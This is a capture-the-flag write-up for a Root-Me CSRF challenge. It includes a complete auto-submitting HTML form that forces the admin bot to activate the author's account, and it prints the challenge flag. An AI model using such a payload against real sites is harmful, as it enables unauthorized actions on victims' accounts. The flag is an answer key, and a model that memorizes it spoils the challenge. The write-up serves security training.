# CSRF - 0 protection

**Point**: 35 Points 

## Solution:

This is a basic CSRF vulnerability. Get in the page, we see a form: 

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159601753-f08b4ef7-75f1-43b3-8b28-3b0c8e0a5aea.png" ></p>

Before "Login", we have to register. Move to "Register" and create an account. For example, in my case, username is `khangtictoc` and password is `123`

Log in this account. Move to "Private" 

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159602721-0d988354-cb0f-43bd-ba64-49e8a20feea5.png" ></p>


This section is for activated account. So we could reach that via sending a malicious HTML content to "Contact". 

But how do we achieve this action ? In "Profile", there's a **disable** checkbox and a button "Submit". 

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159603119-dc64359d-bb4e-4fb7-bfbd-0114c02b2d94.png" ></p>

Enable the checkbox, in "Dev Tool" (F12) replace `disabled=""` with `checked`. Then click "Submit" button.

```html
<input type="checkbox" name="status" checked>
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159604050-ebe23dce-fbd6-4f24-9377-006d78f291fb.png" ></p>

Only **admin** can do this action. Move to "Network" section, examine **Request Headers**:

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159605145-6f1167f6-4b58-4b74-bac5-cba9448f3a1f.png" ></p>

This meet requirements for CSRF:
- Only **cookie** use to identify user
- **Origin** and **Referer**. We use form with POST request to send data, we can bypass this

We could make **administrator** do the activation for us. Constructing a auto-submit form. Copy the given form:

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159605827-cfb26c6c-f62d-4864-a8d2-a7010b0ee6ee.png" ></p>

Changing `checkbox` as we've done previous. Create payload: 
- Make sure value in **input/type=text** is our **username** 
- Set an `id=form` for easy **querySelector**, there's 1 form so we can confidently name any id  
- Set `action` to "http://challenge01.root-me.org/web-client/ch22/?action=profile" for fixed path, we can "POST" data no matters the place(domain) we are
- Add **javascript code** for auto-submit.
- Put the payload in full **HTML format**. The payload 's contained in `<html></html>` and in `<body></body>`

Your email: khangtictoc@gmail.com (arbitrary string)
Comment:

```html
<html>
  <body>
      <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" id="form" enctype="multipart/form-data">
		    <div class="form-group">
		    <label>Username:</label>
		    <input type="text" name="username" value="khangtictoc">
		    </div>
		    <br>		
		    <div class="form-group">
		    <label>Status:</label>
		    <input type="checkbox" name="status" checked>
		    </div>
		    <br>	
        <button type="submit">Submit</button>
	    </form>
    <script>document.getElementById("form").submit(); </script>
    <body>
</html>
```

Wait for a while for autbot's working. Direct to "Private" section:

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159609361-00cc5132-5e08-4e9b-a98d-3f58e733f6ea.png" ></p>

Flag: **Csrf_Fr33style-L3v3l1!**
